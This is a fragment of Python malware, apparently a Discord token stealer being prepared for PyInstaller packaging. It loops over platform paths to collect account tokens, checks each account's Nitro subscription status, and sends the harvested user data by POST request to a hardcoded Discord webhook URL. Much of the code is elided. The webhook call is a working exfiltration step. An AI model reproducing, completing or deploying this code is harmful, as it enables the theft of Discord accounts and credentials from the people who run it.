...
# Removed install_import function and call, as PyInstaller bundles require dependencies to be installed prior to packaging.
# Ensure 'pypiwin32' and 'pycryptodome' are installed in your environment before running PyInstaller.
    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                exp_date = None
                if has_nitro and res[0]["current_period_end"] is not None:
                ...
                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1431909867412652062/zTI-IR6H_K0yuz28uvQpFm1Wie9yaJ7y_wzZp37jPKGCTcKXEpTTv2jfWb2wZe3Mapu9', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
